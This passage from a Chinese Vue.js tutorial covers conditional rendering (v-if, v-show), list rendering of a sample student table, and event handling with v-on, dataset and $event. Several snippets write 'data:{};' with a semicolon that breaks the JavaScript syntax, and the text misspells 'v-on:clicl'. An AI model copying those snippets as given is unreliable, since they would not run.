tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-else-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code &gt;= 70<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>中等<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-else-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code &gt;= 60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>及格<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-else</span><span class="token punctuation">&gt;</span></span>不想理你<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            code<span class="token operator">:</span><span class="token number">85</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-1-4-v-show"><a href="#7-1-4-v-show" class="headerlink" title="7.1.4 v-show"></a>7.1.4 v-show</h6><blockquote><p>从功能上将v-show和v-if作用是相同的，渲染过程有区别</p></blockquote><p><code>v-if</code> 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。</p><p><code>v-if</code> 也是<strong>惰性的</strong>：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。</p><p>相比之下，<code>v-show</code> 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p><p>一般来说，<code>v-if</code> 有更高的切换开销，而 <code>v-show</code> 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 <code>v-show</code> 较好；如果在运行时条件很少改变，则使用 <code>v-if</code> 较好。</p><h4 id="7-2-列表渲染"><a href="#7-2-列表渲染" class="headerlink" title="7.2 列表渲染"></a>7.2 列表渲染</h4><blockquote><p>将集合数据以表格、列表的形式显示</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/bootstrap.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/bootstrap.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c in categories<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">:href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>query?cid=<span class="token punctuation">'</span>+c.cid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>{{c.cname}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>table table-bordered<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>学号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>照片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>性别<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>年龄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s,index in stus<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name">:id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>tr<span class="token punctuation">'</span>+s.stuNum<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuNum}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token attr-name">:src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuImg<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuName}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--{{s.stuGender=='M'?'男':'女'}}--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuGender==<span class="token punctuation">'</span>M<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img/m.bmp<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">v-else</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img/f.bmp<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuAge}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-danger btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name">:href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>stu/delete?cid=<span class="token punctuation">'</span>+s.stuNum<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-success btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name">:href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>stu/update?cid=<span class="token punctuation">'</span>+s.stuNum<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>categories<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>cid<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>cname<span class="token operator">:</span><span class="token string">"华为"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>cid<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span>cname<span class="token operator">:</span><span class="token string">"小米"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>cid<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">,</span>cname<span class="token operator">:</span><span class="token string">"OPPO"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>cid<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span>cname<span class="token operator">:</span><span class="token string">"VIVO"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stus<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>stuNum<span class="token operator">:</span><span class="token string">"10010"</span><span class="token punctuation">,</span>stuImg<span class="token operator">:</span><span class="token string">"img/01.jpg"</span><span class="token punctuation">,</span>stuName<span class="token operator">:</span><span class="token string">"Tom"</span><span class="token punctuation">,</span>stuGender<span class="token operator">:</span><span class="token string">"M"</span><span class="token punctuation">,</span>stuAge<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>stuNum<span class="token operator">:</span><span class="token string">"10011"</span><span class="token punctuation">,</span>stuImg<span class="token operator">:</span><span class="token string">"img/02.jpg"</span><span class="token punctuation">,</span>stuName<span class="token operator">:</span><span class="token string">"LiLei"</span><span class="token punctuation">,</span>stuGender<span class="token operator">:</span><span class="token string">"M"</span><span class="token punctuation">,</span>stuAge<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>stuNum<span class="token operator">:</span><span class="token string">"10012"</span><span class="token punctuation">,</span>stuImg<span class="token operator">:</span><span class="token string">"img/03.jpg"</span><span class="token punctuation">,</span>stuName<span class="token operator">:</span><span class="token string">"Lucy"</span><span class="token punctuation">,</span>stuGender<span class="token operator">:</span><span class="token string">"F"</span><span class="token punctuation">,</span>stuAge<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>stuNum<span class="token operator">:</span><span class="token string">"10013"</span><span class="token punctuation">,</span>stuImg<span class="token operator">:</span><span class="token string">"img/04.jpg"</span><span class="token punctuation">,</span>stuName<span class="token operator">:</span><span class="token string">"Polly"</span><span class="token punctuation">,</span>stuGender<span class="token operator">:</span><span class="token string">"F"</span><span class="token punctuation">,</span>stuAge<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="八、事件处理"><a href="#八、事件处理" class="headerlink" title="八、事件处理"></a>八、事件处理</h2><blockquote><ul><li><p>在使用vue进行数据渲染时，如果使用原生js事件绑定(例如onclick)，如果需要获取vue实例中的数据并传参则需要通过拼接来完成</p></li><li><p>vue提供了v-on指令用于绑定各种事件（v-on:click），简化了从vue取值的过程，但是触发的方法需要定义在vue实例的 methods中</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doDelete(s.stuNum,s.stuName)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">doDelete</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">snum<span class="token punctuation">,</span>sname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"----delete:"</span><span class="token operator">+</span>snum<span class="token operator">+</span><span class="token string">"   "</span><span class="token operator">+</span>sname<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>v-on:clicl</code>可以缩写为<code>@click</code></p></li></ul></blockquote><h4 id="8-1-使用JS函数传值"><a href="#8-1-使用JS函数传值" class="headerlink" title="8.1 使用JS函数传值"></a>8.1 使用JS函数传值</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-danger btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doDelete(s.stuNum,s.stuName)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">doDelete</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">snum<span class="token punctuation">,</span>sname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"----delete:"</span><span class="token operator">+</span>snum<span class="token operator">+</span><span class="token string">"   "</span><span class="token operator">+</span>sname<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-2-使用dataset对象传值"><a href="#8-2-使用dataset对象传值" class="headerlink" title="8.2 使用dataset对象传值"></a>8.2 使用dataset对象传值</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-success btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doUpdate<span class="token punctuation">"</span></span> <span class="token attr-name">:data-snum</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuNum<span class="token punctuation">"</span></span><span class="token attr-name">:data-sname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuName<span class="token punctuation">"</span></span> <span class="token attr-name">:data-simg</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuImg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">doUpdate</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token comment">//如果v-on绑定的js函数没有参数，调用的时候可以省略()，同时可以给js函数一个event参数(事件对象)</span>                <span class="token comment">// 1. event 表示触发当前函数的事件</span>                <span class="token comment">// 2. event.srcElement 表示发生事件的元素---修改按钮</span>                <span class="token comment">// 3. event.srcElement.dataset 表示按钮上绑定的数据集（data-开头的属性）</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"-----update"</span><span class="token punctuation">)</span>                <span class="token keyword">var</span> stu <span class="token operator">=</span> event<span class="token punctuation">.</span>srcElement<span class="token punctuation">.</span>dataset<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-3-混合使用"><a href="#8-3-混合使用" class="headerlink" title="8.3 混合使用"></a>8.3 混合使用</h4><ul><li><code>$event</code></li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-danger btn-xs<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doDelete(s.stuNum,s.stuName,$event)<span class="token punctuation">"</span></span><span class="token attr-name">:data-simg</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuImg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">doDelete</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">snum<span class="token punctuation">,</span>sname<span class="token punctuation">,</span>event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"----delete:"</span><span class="token operator">+</span>snum<span class="token operator">+</span><span class="token string">"   "</span><span class="token operator">+</span>sname<span class="token punctuation">)</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>srcElement<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token 